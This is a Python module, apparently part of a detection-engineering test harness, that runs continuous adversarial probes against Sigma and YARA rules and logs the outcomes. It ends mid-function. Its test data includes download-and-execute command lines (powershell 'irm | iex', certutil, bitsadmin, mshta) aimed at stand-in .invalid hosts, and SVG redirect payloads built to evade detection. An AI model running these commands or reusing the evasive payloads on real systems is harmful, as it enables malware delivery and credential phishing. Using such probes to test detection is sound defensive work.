"""Endurance runner: bounded long-run continuous boundary mapping.

Executes continuous multi-vector testing across all evasion axes:
1. Polymorphic LOLBin proxying & argument masking (Sigma).
2. Multi-stage kill-chain intrusion campaigns with rotating evasion profiles.
3. Directed acyclic graph (DAG) correlation state machine walks.
4. Active content & SVG parser differential mutations (YARA).
5. Real-world telemetry replay sweeps (Mordor & authentic EVTX).
6. High-volume enterprise noise floor & SNR calibration.

Persists time-series boundary histories, state checkpoints, and detailed streaming logs.
Integrates graceful shutdown signaling to trigger automatic strategic cable synthesis.
"""

from __future__ import annotations

import argparse
import datetime
import http.server
import json
import logging
import os
import random
import signal
import sys
import threading
import time
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from .analyst import SwarmAnalyst
from .campaign import CampaignOrchestrator
from .config import OperatorDirective
from .critic import SwarmCritic
from .d3fend_mapper import D3fendMapper
from .detectors import SigmaDetector, YaraDetector
from .export_layer import MitreLayerExporter
from .graph_engine import GraphEngine
from .models import Variant
from .noise_floor import run_benchmark
from .prompt_engine import PromptEngine
from .records import (
    KIND_ATTACK_VARIANT,
    KIND_CAMPAIGN_STAGE,
    KIND_CAMPAIGN_SUMMARY,
    KIND_DAG_VISIT,
    KIND_NOISE_BENCHMARK,
    KIND_TELEMETRY_SWEEP,
    KIND_WALK_SUMMARY,
    OUTCOME_CONTAINED,
    OUTCOME_DETECTED,
    OUTCOME_ERROR,
    OUTCOME_EVADED,
    OUTCOME_UNCLASSIFIED,
    OUTCOME_UNCONTAINED,
    Observation,
    RecordWriter,
    aggregate as aggregate_records,
    canonical_payload_hash,
    existing_record_count,
    latest_run_id,
    load_records,
    records_path_for,
    sha256_file,
    to_runner_counters,
)
from .synthesizer import StrategicSynthesizer
from .telemetry_replay import TelemetryReplayEngine

ROOT = Path(__file__).resolve().parents[2]
RESULTS_DIR = ROOT / "docs" / "swarm" / "results"
CHECKPOINTS_DIR = RESULTS_DIR / "checkpoints"
STATE_FILE = RESULTS_DIR / "endurance_state.json"
LOG_FILE = RESULTS_DIR / "endurance_run.log"
STOP_FILE = RESULTS_DIR / "STOP_ENDURANCE"

logger = logging.getLogger("swarm.endurance")


class EnduranceRunner:
    """Orchestrates an unattended, continuous multi-pattern adversarial endurance run."""

    def __init__(
        self,
        pace_seconds: float = 0.4,
        serve_workbench: bool = True,
        http_port: int = 8000,
        resume: bool = False,
        results_dir: Optional[Path] = None,
        stop_file: Optional[Path] = None,
    ) -> None:
        self.pace = pace_seconds
        self.serve_workbench = serve_workbench
        self.http_port = http_port
        self.running = False
        self.stop_requested = False
        self.results_dir = Path(results_dir) if results_dir else RESULTS_DIR
        self.checkpoints_dir = self.results_dir / "checkpoints"
        self.state_file = self.results_dir / "endurance_state.json"
        self.log_file = self.results_dir / "endurance_run.log"
        self.stop_file = Path(stop_file) if stop_file else (self.results_dir / "STOP_ENDURANCE")

        # Observation-record layer: append-only JSONL; aggregates derive from it
        stamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        self.run_id = f"endur-{stamp}-{uuid.uuid4().hex[:6]}"
        self._record_start_seq = 0
        self.record_writer: Optional[RecordWriter] = None

        # Core engines
        self.critic = SwarmCritic()
        self.analyst = SwarmAnalyst()
        self.prompt_engine = PromptEngine()
        self.campaign_orchestrator = CampaignOrchestrator(repo_root=ROOT)
        self.graph_engine = GraphEngine()
        self.replay_engine = TelemetryReplayEngine()
        self.synthesizer = StrategicSynthesizer(results_dir=self.results_dir)
        self.sigma_detector = SigmaDetector()
        self.yara_detector = YaraDetector()
        self.mitre_exporter = MitreLayerExporter()
        self.d3fend_mapper = D3fendMapper()

        # Telemetry datasets
        self.telemetry_fixtures = [
            ROOT / "tests" / "fixtures" / "telemetry" / "mordor_lsass_dump.jsonl",
            ROOT / "tests" / "fixtures" / "telemetry" / "mordor_schtasks_persistence.jsonl",
            ROOT / "tests" / "fixtures" / "telemetry" / "benign_enterprise_workstation.jsonl",
            ROOT / "tests" / "fixtures" / "telemetry" / "sample_sysmon_process_create.evtx",
        ]

        # Aggregated statistics
        self.start_time = datetime.datetime.now(datetime.timezone.utc)
        self.total_cycles = 0
        self.total_probes = 0
        self.critic_approved = 0
        self.critic_blocked = 0
        self.true_positives = 0
        self.evasion_gaps = 0

        # Per-target sparring counters — real observations, never ratio allocations
        self.target_probes: Dict[str, Dict[str, int]] = {
            "sigma": {"probes": 0, "approved": 0, "detected": 0, "gaps": 0},
            "yara": {"probes": 0, "approved": 0, "detected": 0, "gaps": 0},
        }

        self.campaigns_count = 0
        self.campaigns_contained = 0
        self.campaign_dod_sum = 0.0

        self.graph_walks_count = 0
        self.graph_walks_contained = 0
        self.graph_dod_sum = 0.0
        self.graph_mttd_sum = 0.0
        self.graph_detected_count = 0

        self.replay_evals_count = 0
        self.noise_benchmarks_count = 0

        # Cluster breakdown
        self.cluster_counts = {
            "Cluster A: LOLBin & Process Proxying": 0,
            "Cluster B: Argument Masking & Parameter Aliasing": 0,
            "Cluster C: Parser Differentials & Offset Padding": 0,
            "Cluster D: Sensor Blinding & Telemetry Tampering": 0,
        }

        # Record-layer mirrors (reconcile against records/run-*.jsonl)
        self.benign_events = 0
        self.benign_false_positives = 0
        self.gated_approved = 0
        self.error_records = 0

        self.recent_findings: List[Dict[str, Any]] = []
        self.current_pattern_suite = "Initializing"

        # Ensure directories
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.checkpoints_dir.mkdir(parents=True, exist_ok=True)

        # Clear any stale stop signal
        if self.stop_file.exists():
            try:
                self.stop_file.unlink()
            except OSError:
                pass

        # Handlers
        self._file_handler: Optional[logging.FileHandler] = None
        self._setup_logging()
        self.httpd: Optional[http.server.HTTPServer] = None
        if resume:
            self.load_prior_state()

    def load_prior_state(self) -> bool:
        """Restores cumulative statistics from endurance_state.json if present.

        When the prior run's observation records are on disk, every counter is
        rebuilt exactly from the raw records — they are the source of truth and
        no value is reconstructed from a rounded aggregate rate.  States
        without records (pre-record-layer) fall back to a coarser float-summary
        restore and say so in the log.
        """
        if not self.state_file.exists():
            return False
        try:
            data = json.loads(self.state_file.read_text(encoding="utf-8"))
        except Exception as exc:
            logger.warning("Could not restore prior state: %s", exc)
            return False

        prior_run = data.get("run_id")
        if prior_run is None:
            prior_run = latest_run_id(self.results_dir)
        if prior_run and existing_record_count(self.results_dir, prior_run) > 0:
            agg = aggregate_records(load_records(self.results_dir, prior_run))
            counters = to_runner_counters(agg)
            self.run_id = prior_run
            self._record_start_seq = agg.n_records
            self.total_cycles = data.get("total_cycles", 0)
            self.total_probes = counters["total_probes"]
            self.critic_approved = counters["critic_approved"]
            self.critic_blocked = counters["gated_blocked"]
            self.true_positives = counters["true_positives"]
            self.evasion_gaps = counters["evasion_gaps"]
            for target_type, bucket in counters["target_probes"].items():
                merged = self._target_bucket(target_type)
                for key in ("probes", "approved", "detected", "gaps"):
                    merged[key] = int(bucket.get(key, 0))
            for cluster, count in counters["cluster_counts"].items():
                self.cluster_counts[cluster] = int(count)
            self.campaigns_count = counters["campaigns_count"]
            self.campaigns_contained = counters["campaigns_contained"]
            self.campaign_dod_sum = counters["campaign_dod_sum"]
            self.graph_walks_count = counters["graph_walks_count"]
            self.graph_walks_contained = counters["graph_walks_contained"]
            self.graph_dod_sum = counters["graph_dod_sum"]
            self.graph_mttd_sum = counters["graph_mttd_sum"]
            self.graph_detected_count = counters["graph_detected_count"]
            self.replay_evals_count = counters["replay_evals_count"]
            self.noise_benchmarks_count = counters["noise_benchmarks_count"]
            self.benign_events = counters["benign_events"]
            self.benign_false_positives = counters["benign_false_positives"]
            self.gated_approved = counters["gated_approved"]
            self.error_records = counters["error_records"]
            if "start_time" in data:
                try:
                    self.start_time = datetime.datetime.fromisoformat(data["start_time"])
                except Exception:
                    pass
            logger.info(
                "Resumed run %s: %d cycles rebuilt exactly from %d observation records",
                prior_run,
                self.total_cycles,
                agg.n_records,
            )
            return True

        # Legacy fallback: no raw records on disk (pre-record-layer state).
        try:
            self.total_cycles = data.get("total_cycles", 0)
            self.total_probes = data.get("probes_evaluated", 0)
            self.critic_approved = data.get("critic_approved", 0)
            self.critic_blocked = data.get("critic_blocked", 0)
            self.true_positives = data.get("true_positives", 0)
            self.evasion_gaps = data.get("evasion_gaps", 0)
            self.campaigns_count = data.get("campaigns_evaluated", 0)
            self.campaigns_contained = int(self.campaigns_count * data.get("campaign_containment_rate", 1.0))
            self.campaign_dod_sum = self.campaigns_count * data.get("average_depth_of_defense", 0.94)
            self.graph_walks_count = data.get("graph_walks_evaluated", 0)
            self.graph_walks_contained = self.graph_walks_count
            self.graph_dod_sum = self.graph_walks_count * data.get("average_depth_of_defense", 0.94)
            self.graph_detected_count = self.graph_walks_count
            self.replay_evals_count = data.get("telemetry_replays_evaluated", 0)
            self.noise_benchmarks_count = data.get("noise_benchmarks_evaluated", 0)
            if "cluster_breakdown" in data:
                self.cluster_counts.update(data["cluster_breakdown"])
            if "start_time" in data:
                try:
                    self.start_time = datetime.datetime.fromisoformat(data["start_time"])
                except Exception:
                    pass
            logger.warning(
                "Restored approximate counters from state summary (no observation records found)"
            )
            return True
        except Exception as exc:
            logger.warning("Could not restore prior state: %s", exc)
            return False

    def _setup_logging(self) -> None:
        logger.setLevel(logging.INFO)
        formatter = logging.Formatter(
            fmt="%(asctime)s [%(levelname)s] %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S",
        )
        # File handler (append mode)
        self._file_handler = logging.FileHandler(self.log_file, encoding="utf-8")
        self._file_handler.setFormatter(formatter)
        logger.addHandler(self._file_handler)

        # Stdout handler (add only once across instances)
        if not any(isinstance(h, logging.StreamHandler) and not isinstance(h, logging.FileHandler) for h in logger.handlers):
            ch = logging.StreamHandler(sys.stdout)
            ch.setFormatter(formatter)
            logger.addHandler(ch)

    def close(self) -> None:
        """Releases open file handlers and stops HTTP server if active."""
        if self._file_handler:
            logger.removeHandler(self._file_handler)
            self._file_handler.close()
            self._file_handler = None
        if self.httpd:
            try:
                self.httpd.shutdown()
            except Exception:
                pass
            self.httpd = None

    def __enter__(self) -> EnduranceRunner:
        return self

    def __exit__(self, exc_type: Any, exc_val: Any, exc_tb: Any) -> None:
        self.close()

    def __del__(self) -> None:
        self.close()

    def start_http_server(self) -> None:
        """Starts a background HTTP daemon for swarm_workbench.html viewing."""
        if not self.serve_workbench:
            return

        class WorkbenchHandler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args: Any, **kwargs: Any) -> None:
                super().__init__(*args, directory=str(ROOT), **kwargs)

            def log_message(self, format: str, *args: Any) -> None:
                pass  # Suppress HTTP request logs to keep terminal clean

        for port in [self.http_port, self.http_port + 1, self.http_port + 2]:
            try:
                self.httpd = http.server.HTTPServer(("127.0.0.1", port), WorkbenchHandler)
                t = threading.Thread(target=self.httpd.serve_forever, daemon=True)
                t.start()
                logger.info("Boundary workbench server active at http://localhost:%d/swarm_workbench.html", port)
                break
            except OSError:
                continue

    def run(self, max_cycles: Optional[int] = None) -> Dict[str, Any]:
        """Main execution loop running interesting patterns continuously until stopped."""
        self.running = True
        logger.info("=" * 72)
        logger.info("ADVERSARIAL WORKBENCH ENDURANCE ENGINE DEPLOYED")
        logger.info("Target: continuous detection boundary mapping")
        logger.info("Safety: RFC 2606 reserved domains | Local memory execution only")
        logger.info("Pace: %.2fs delay between pattern suites", self.pace)
        logger.info("Results Directory: %s", self.results_dir)
        logger.info("=" * 72)

        self.start_http_server()

        # Observation-record ledger for this run
        writer = self._ensure_writer()
        logger.info("Observation records: %s", writer.path)

        # Handle termination signals
        def _sig_handler(signum: int, frame: Any) -> None:
            logger.info("Termination signal received (%d). Requesting clean stop...", signum)
            self.stop_requested = True

        signal.signal(signal.SIGINT, _sig_handler)
        signal.signal(signal.SIGTERM, _sig_handler)

        suite_cycle = 0

        while self.running and not self.stop_requested:
            if max_cycles and self.total_cycles >= max_cycles:
                logger.info("Reached requested max cycles limit (%d). Wrapping up...", max_cycles)
                break

            if self.stop_file.exists():
                logger.info("Detected stop signal file: %s. Initiating graceful wrap-up...", self.stop_file)
                break

            suite_cycle += 1
            self.total_cycles += 1

            # Select and run pattern suite
            suite_id = suite_cycle % 6
            try:
                if suite_id == 0:
                    self._run_multi_stage_campaign()
                elif suite_id == 1:
                    self._run_lolbin_proxy_sparring()
                elif suite_id == 2:
                    self._run_dag_state_machine_walk()
                elif suite_id == 3:
                    self._run_yara_active_content_probing()
                elif suite_id == 4:
                    self._run_telemetry_replay_sweep()
                elif suite_id == 5:
                    self._run_noise_floor_calibration()
            except Exception as exc:
                logger.error("Error during pattern suite %d: %s", suite_id, exc, exc_info=True)

            # Persist state
            self._save_state()

            # Periodic milestones
            if self.total_cycles % 100 == 0:
                self._update_layers()
                res_str = f"{self.current_resilience * 100:.1f}%" if self.current_resilience is not None else "n/a"
                dod_str = f"{self.average_dod:.2f}" if self.average_dod is not None else "n/a"
                cont_str = f"{self.containment_rate * 100:.1f}%" if self.containment_rate is not None else "n/a"
                logger.info(
                    "[Milestone] Cycle %d | Probes: %d | Resilience: %s | DoD: %s | Containment: %s",
                    self.total_cycles,
                    self.total_probes,
                    res_str,
                    dod_str,
                    cont_str,
                )

            if self.total_cycles % 500 == 0:
                self._save_checkpoint()

            if self.pace > 0:
                time.sleep(self.pace)

        # Wrap up execution
        return self._finish_run()

    # -------------------------------------------------------------------------
    # Pattern Suite 1: LOLBin & Process Proxy Permutations (Sigma)
    # -------------------------------------------------------------------------
    def _run_lolbin_proxy_sparring(self) -> None:
        self.current_pattern_suite = "Polymorphic LOLBin Proxying & Argument Aliasing (Sigma)"

        lolbins = [
            ("pcalua", 'pcalua.exe -a powershell.exe -c "irm https://cdn.delivery.stage.invalid/update.ps1 | iex"', "Cluster A: LOLBin & Process Proxying"),
            ("wt", 'wt.exe powershell.exe -w hidden -c "irm https://cdn.delivery.stage.invalid/update.ps1 | iex"', "Cluster A: LOLBin & Process Proxying"),
            ("hh", 'hh.exe https://cdn.delivery.stage.invalid/lure.chm', "Cluster A: LOLBin & Process Proxying"),
            ("conhost", 'conhost.exe powershell.exe -w hidden -c "irm https://cdn.delivery.stage.invalid/update.ps1 | iex"', "Cluster A: LOLBin & Process Proxying"),
            ("rundll32", 'rundll32.exe url.dll,FileProtocolHandler https://auth.stage.invalid/update.hta', "Cluster A: LOLBin & Process Proxying"),
            ("cmd_bg", 'cmd.exe /c start /b powershell.exe -w 1 -c "irm https://cdn.delivery.stage.invalid/update.ps1 | iex"', "Cluster A: LOLBin & Process Proxying"),
            ("certutil", 'certutil.exe -urlcache -split -f https://cdn.delivery.stage.invalid/payload.exe %TEMP%\\update.exe', "Cluster A: LOLBin & Process Proxying"),
            ("bitsadmin", 'bitsadmin.exe /transfer myJob /download /priority normal https://cdn.delivery.stage.invalid/payload.exe %TEMP%\\update.exe', "Cluster A: LOLBin & Process Proxying"),
            ("mshta", 'mshta.exe https://cdn.delivery.stage.invalid/script.hta', "Cluster A: LOLBin & Process Proxying"),
            ("curl", 'curl.exe -s -o %TEMP%\\payload.exe https://cdn.delivery.stage.invalid/payload.exe', "Cluster A: LOLBin & Process Proxying"),
            ("stdin_pipe", 'cmd.exe /c type payload.txt | powershell.exe -NoProfile -ExecutionPolicy Bypass -', "Cluster B: Argument Masking & Parameter Aliasing"),
            ("switch_w1", 'powershell.exe -w 1 -c "irm https://cdn.delivery.stage.invalid/update | iex"', "Cluster B: Argument Masking & Parameter Aliasing"),
            ("switch_wh", 'powershell.exe -w h -c "irm https://cdn.delivery.stage.invalid/update | iex"', "Cluster B: Argument Masking & Parameter Aliasing"),
            ("cmdlet_split", 'powershell.exe -c "&(\'Inv\'+\'oke-RestMethod\') https://cdn.delivery.stage.invalid/update.ps1 | iex"', "Cluster B: Argument Masking & Parameter Aliasing"),
        ]

        name, cmd, cluster = random.choice(lolbins)
        var_id = f"proc-{uuid.uuid4().hex[:8]}"
        variant = Variant(
            id=var_id,
            target_type="sigma",
            axis="lolbin_proxy" if "Cluster A" in cluster else "syntax",
            mutation_name=f"endurance_{name}",
            description=f"Endurance mutation {name} across execution proxies",
            payload={
                "EventID": 1,
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": f"C:\\Windows\\System32\\{name.split('_')[0]}.exe" if not name.startswith("switch") and not name.startswith("cmdlet") else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": cmd,
                "User": "VICTIM-PC\\analyst",
            },
            cycle=1,
        )

        self._evaluate_probe(variant, cluster)

    # -------------------------------------------------------------------------
    # Pattern Suite 2: Multi-Stage Intrusion Kill Chain Campaigns
    # -------------------------------------------------------------------------
    def _run_multi_stage_campaign(self) -> None:
        self.current_pattern_suite = "Multi-Stage Kill Chain Campaign (5 Stages)"

        # Evasion profiles to stress defense in depth
        profiles = [
            [],           # Baseline: no evasion
            [1],          # Evasion at Ingress (SVG)
            [2],          # Evasion at Execution (pcalua / wt)
            [3],          # Evasion at Defense Tampering
            [4],          # Evasion at Credential Dumping
            [1, 2],       # Ingress + Execution bypass
            [2, 3],       # Execution + Defense Impairment bypass
            [2, 4],       # Execution + Credential Access bypass
            [1, 2, 4],    # Compound multi-stage bypass
        ]
        evasions = random.choice(profiles)
        camp_num = self.campaigns_count + 1

        result = self.campaign_orchestrator.run_campaign(
            campaign_name=f"Endurance-Campaign-Run{camp_num}",
            campaign_id=f"CAMP-ENDUR-{camp_num:04d}",
            evasion_at_stages=evasions,
            propose_patches=False,
        )

        self.campaigns_count += 1
        if result.intercepted:
            self.campaigns_contained += 1
        self.campaign_dod_sum += result.depth_of_defense_score

        for st in result.stages:
            self.total_probes += 1
            self.critic_approved += 1
            detected = st.detection_result.detected
            cluster = "Cluster A: LOLBin & Process Proxying" if st.stage_number == 2 else (
                "Cluster C: Parser Differentials & Offset Padding" if st.stage_number == 1 else (
                    "Cluster D: Sensor Blinding & Telemetry Tampering" if st.stage_number == 3 else "Cluster B: Argument Masking & Parameter Aliasing"
                )
            )
            if detected:
                self.true_positives += 1
            else:
                self.evasion_gaps += 1
                self.cluster_counts[cluster] += 1
            self._emit(
                suite="endurance.campaign",
                kind=KIND_CAMPAIGN_STAGE,
                probe_id=f"CAMP-ENDUR-{camp_num:04d}-stage{st.stage_number}",
                cluster=cluster,
                outcome=OUTCOME_DETECTED if detected else OUTCOME_EVADED,
                detail={"stage_number": st.stage_number, "campaign": f"CAMP-ENDUR-{camp_num:04d}"},
            )

        self._emit(
            suite="endurance.campaign",
            kind=KIND_CAMPAIGN_SUMMARY,
            probe_id=f"CAMP-ENDUR-{camp_num:04d}",
            outcome=OUTCOME_CONTAINED if result.intercepted else OUTCOME_UNCONTAINED,
            detail={
                "depth_of_defense": result.depth_of_defense_score,
                "interception_stage": result.interception_stage,
                "interception_technique": result.interception_technique,
                "evasions": list(evasions),
            },
        )

        status_str = f"INTERCEPTED at {result.interception_stage} ({result.interception_technique})" if result.intercepted else "UNCONTAINED"
        logger.info(
            "    [Campaign %04d] %-42s | DoD: %.2f | Evasions: %s",
            camp_num,
            status_str,
            result.depth_of_defense_score,
            evasions,
        )

    # -------------------------------------------------------------------------
    # Pattern Suite 3: DAG State Machine Correlation Walks
    # -------------------------------------------------------------------------
    def _run_dag_state_machine_walk(self) -> None:
        self.current_pattern_suite = "DAG State Machine Correlation Walk (Epic 2)"
        # Rotate the evasion profile across successive suite invocations so the
        # defense-in-depth / MTTD path is actually exercised (a bare single-walk
        # call would otherwise always select the no-evasion baseline profile).
        results = self.graph_engine.run_walks(iterations=1, profile_offset=self.graph_walks_count)
        if results:
            res = results[0]
            self.graph_walks_count += 1
            if res.contained:
                self.graph_walks_contained += 1
            self.graph_dod_sum += res.depth_of_defense_score
            if res.mttd_seconds is not None:
                self.graph_mttd_sum += res.mttd_seconds
                self.graph_detected_count += 1

            for visit in res.visits:
                self.total_probes += 1
                self.critic_approved += 1
                detected = visit.detected
                cluster = "Cluster A: LOLBin & Process Proxying" if "execution" in visit.node_id else "Cluster C: Parser Differentials & Offset Padding"
                if detected:
                    self.true_positives += 1
                else:
                    self.evasion_gaps += 1
                    self.cluster_counts[cluster] += 1
                self._emit(
                    suite="endurance.dag",
                    kind=KIND_DAG_VISIT,
                    probe_id=f"walk{self.graph_walks_count}-{visit.node_id}",
                    cluster=cluster,
                    outcome=OUTCOME_DETECTED if detected else OUTCOME_EVADED,
                    detail={"node_id": visit.node_id, "walk": self.graph_walks_count},
                )

            self._emit(
                suite="endurance.dag",
                kind=KIND_WALK_SUMMARY,
                probe_id=f"walk{self.graph_walks_count}",
                outcome=OUTCOME_CONTAINED if res.contained else OUTCOME_UNCONTAINED,
                detail={
                    "depth_of_defense": res.depth_of_defense_score,
                    "mttd_seconds": res.mttd_seconds,
                    "intercepted": res.intercepted,
                    "interception_node": res.interception_node,
                    "visits": len(res.visits),
                },
            )

            mttd_str = f"{res.mttd_seconds:.0f}s" if res.mttd_seconds is not None else "n/a"
            inter_str = f"Intercepted at {res.interception_node}" if res.intercepted else "UNCONTAINED"
            logger.info(
                "    [DAG Walk %04d] %-42s | DoD: %.2f | MTTD: %s",
                self.graph_walks_count,
                inter_str,
                res.depth_of_defense_score,
                mttd_str,
            )

    # -------------------------------------------------------------------------
    # Pattern Suite 4: Active-Content SVG Ingress Probing (YARA)
    # -------------------------------------------------------------------------
    def _run_yara_active_content_probing(self) -> None:
        self.current_pattern_suite = "Active-Content SVG Parser Differentials (YARA)"

        paddings = [512, 1024, 1500, 2048, 3072, 4096, 4500, 6000, 8192]
        pad = random.choice(paddings)
        prefix = f"<!-- {'P' * pad} -->\n" if pad > 0 else ""

        modes = [
            ("foreignObject_meta_refresh", f'{prefix}<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><meta http-equiv="refresh" content="0;url=https://auth.stage.invalid/login"/></body></foreignObject></svg>', "Cluster C: Parser Differentials & Offset Padding"),
            ("namespace_svg_prefix", f'{prefix}<svg:svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg">\n  <script>location.replace("https://auth.stage.invalid/login");</script>\n</svg:svg>', "Cluster C: Parser Differentials & Offset Padding"),
            ("smil_animate_href", f'{prefix}<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="href" values="https://auth.stage.invalid/login" begin="0s"/><a href="#"><text>Click</text></a></svg>', "Cluster C: Parser Differentials & Offset Padding"),
            ("bracket_concat_js", f'{prefix}<svg xmlns="http://www.w3.org/2000/svg"><script>window["loc"+"ation"]["hr"+"ef"] = "https://auth.stage.invalid/login";</script></svg>', "Cluster B: Argument Masking & Parameter Aliasing"),
            ("cdata_enclosed_script", f'{prefix}<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[ window.location.href = "https://auth.stage.invalid/login"; ]]></script></svg>', "Cluster C: Parser Differentials & Offset Padding"),
            ("onerror_image_redirect", f'{prefix}<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="location.replace(\'https://auth.stage.invalid/login\')"/></svg>', "Cluster B: Argument Masking & Parameter Aliasing"),
        ]

        mode_name, payload, cluster = random.choice(modes)
        variant = Variant(
            id=f"svg-{uuid.uuid4().hex[:8]}",
            target_type="yara",
            axis="parser_differential" if "Cluster C" in cluster else "syntax",
            mutation_name=f"endurance_{mode_name}_pad_{pad}",
            description=f"Endurance SVG probe {mode_name} with {pad}B padding",
            payload=payload,
            cycle=1,
        )

        self._evaluate_probe(variant, cluster)

    # -------------------------------------------------------------------------
    # Pattern Suite 5: Real-World Telemetry Replay Sweep
    # -------------------------------------------------------------------------
    def _run_telemetry_replay_sweep(self) -> None:
        self.current_pattern_suite = "Real-World Telemetry Replay Sweep (EVTX & JSONL)"
        valid_fixtures = [f for f in self.telemetry_fixtures if f.exists()]
        if not valid_fixtures:
            return

        corpus = random.choice(valid_fixtures)
        window = random.choice([30, 60, 120, 300])
        is_benign = "benign" in corpus.name.lower()

        try:
            report = self.replay_engine.replay_file(corpus, is_benign=is_benign, window_seconds=window)
        except Exception as exc:
            self.error_records += 1
            self._emit(
                suite="endurance.replay",
                kind=KIND_TELEMETRY_SWEEP,
                probe_id=corpus.name,
                fixture_hash=f"sha256:{sha256_file(corpus)}",
                outcome=OUTCOME_ERROR,
                detail={"error": str(exc), "window_seconds": window},
            )
            raise
        self.replay_evals_count += 1
        self.total_probes += report.total_events
        self.critic_approved += report.total_events

        # Attack corpora: missed events are evasion gaps.  Benign sweeps: alerts
        # are false positives, reported separately from the attack resilience
        # basis — they are not enemy action and never enter the denominator.
        if is_benign:
            self.benign_events += report.total_events
            self.benign_false_positives += report.total_detections
        else:
            self.true_positives += report.total_detections
            self.evasion_gaps += max(0, report.total_events - report.total_detections)

        self._emit(
            suite="endurance.replay",
            kind=KIND_TELEMETRY_SWEEP,
            probe_id=corpus.name,
            fixture_hash=f"sha256:{sha256_file(corpus)}",
            counts={
                "events": report.total_events,
                "detections": report.total_detections,
                "benign": bool(is_benign),
            },
            detail={"window_seconds": window},
        )

        out_path = self.results_dir / "telemetry_replay.json"
        out_path.write_text(report.to_json(), encoding="utf-8", newline="\n")

        logger.info(
            "    [Replay %03d] Corpus: %-32s | Events: %3d | Alerts: %d | Window: %ds",
            self.replay_evals_count,
            corpus.name,
            report.total_events,
            report.total_detections,
            window,
        )

    # -------------------------------------------------------------------------
    # Pattern Suite 6: Enterprise Noise Floor & SNR Calibration
    # -------------------------------------------------------------------------
    def _run_noise_floor_calibration(self) -> None:
        self.current_pattern_suite = "Enterprise Noise Floor & SNR Calibration"
        benign_count, attack_variants = 200, 6
        report = run_benchmark(benign_count=benign_count, attack_variants=attack_variants)
        self.noise_benchmarks_count += 1
        self.total_probes += benign_count + attack_variants
        self.critic_approved += benign_count + attack_variants
        self.true_positives += report.corpus_metrics.true_positives
        self.evasion_gaps += report.corpus_metrics.false_negatives
        benign_fp = int(getattr(report.corpus_metrics, "false_positives", 0))
        self.benign_events += benign_count
        self.benign_false_positives += benign_fp

        self._emit(
            suite="endurance.noise_floor",
            kind=KIND_NOISE_BENCHMARK,
            probe_id=f"noise-{self.noise_benchmarks_count:03d}",
            counts={
                "generated_events": benign_count + attack_variants,
                "generated_attack_variants": attack_variants,
                "benign_events": benign_count,
                "benign_false_positives": benign_fp,
                "attack_events": report.corpus_metrics.true_positives + report.corpus_metrics.false_negatives,
                "attack_true_positives": report.corpus_metrics.true_positives,
                "attack_missed": report.corpus_metrics.false_negatives,
            },
            detail={
                "recall": report.corpus_metrics.recall,
                "precision": report.corpus_metrics.precision,
            },
        )

        ci_low, ci_high = report.false_positive_rate_ci()
        out_path = self.results_dir / "noise_floor.json"
        out_path.write_text(report.to_json(), encoding="utf-8", newline="\n")

        logger.info(
            "    [Noise Floor %02d] FP Rate: %.2f%% (95%% CI: [%.2f%%, %.2f%%]) | Recall: %.2f | Precision: %.2f",
            self.noise_benchmarks_count,
            report.false_positive_rate() * 100,
            ci_low * 100,
            ci_high * 100,
            report.corpus_metrics.recall,
            report.corpus_metrics.precision,
        )

    # -------------------------------------------------------------------------
    # Evaluation Helper
    # -------------------------------------------------------------------------
    def _target_bucket(self, target_type: str) -> Dict[str, int]:
        """Returns the live per-target sparring counter bucket for *target_type*."""
        return self.target_probes.setdefault(
            target_type, {"probes": 0, "approved": 0, "detected": 0, "gaps": 0}
        )

    def _ensure_writer(self) -> RecordWriter:
        """Lazily initializes the append-only observation-record writer."""
        if self.record_writer is None:
            self.record_writer = RecordWriter(
                self.results_dir, self.run_id, start_seq=self._record_start_seq
            )
        return self.record_writer

    def _emit(self, **fields: Any) -> None:
        """Appends one raw observation record to the run ledger.

        An append failure is never swallowed silently: the run is marked degraded and the error
        retained, so no later resume or report can present in-memory counters that have drifted
        from an incomplete ledger as ledger-backed.
        """
        try:
            self._ensure_writer().append(Observation(run_id=self.run_id, **fields))
        except OSError as exc:
            self.ledger_degraded = True
            self.ledger_error = f"{type(exc).__name__}: {exc}"
            logger.error(
                "LEDGER APPEND FAILED (%s): %s - run marked degraded (ledger_complete=false)",
                type(exc).__name__, exc,
            )

    def _records_relpath(self) -> str:
        """Repo-relative path of this run's record ledger (for state embedding)."""
        path = records_path_for(self.results_dir, self.run_id)
        try:
            return str(path.relative_to(ROOT))
        except ValueError:
            return str(path)

    def _record_writer_count(self) -> int:
        if self.record_writer is not None:
            return self.record_writer.count
        return self._record_start_seq

    _RULE_HASH_PATHS = {
        "sigma": ROOT / "rules" / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml",
        "yara": ROOT / "rules" / "yara" / "suspicious_active_content_svg.yar",
    }

    def _rule_hash_for(self, target_type: str) -> Optional[str]:
        """Sha256 of the detection rule a sparring probe was evaluated against."""
        path = self._RULE_HASH_PATHS.get(target_type)
        if path is None:
            return None
        digest = sha256_file(path)
        return f"sha256:{digest}" if digest else None

    def _evaluate_probe(self, variant: Variant, cluster: str) -> None:
        self.total_probes += 1
        self._target_bucket(variant.target_type)["probes"] += 1
        verdict = self.critic.evaluate(variant)

        fixture_hash = f"sha256:{canonical_payload_hash(variant.payload)}"
        rule_hash = self._rule_hash_for(variant.target_type)

        if not verdict.passed:
            self.critic_blocked += 1
            self._emit(
                suite="endurance.sparring",
                kind=KIND_ATTACK_VARIANT,
                probe_id=variant.id,
                target=variant.target_type,
                axis=variant.axis,
                cluster=cluster,
                rule_hash=rule_hash,
                fixture_hash=fixture_hash,
                outcome=OUTCOME_UNCLASSIFIED,
                detail={"mutation": variant.mutation_name, "critic_reason": verdict.reason},
            )
            logger.warning("    [Critic Blocked] %s: %s", variant.mutation_name, verdict.reason)
            return

        self.critic_approved += 1
        self.gated_approved += 1
        target_counts = self._target_bucket(variant.target_type)
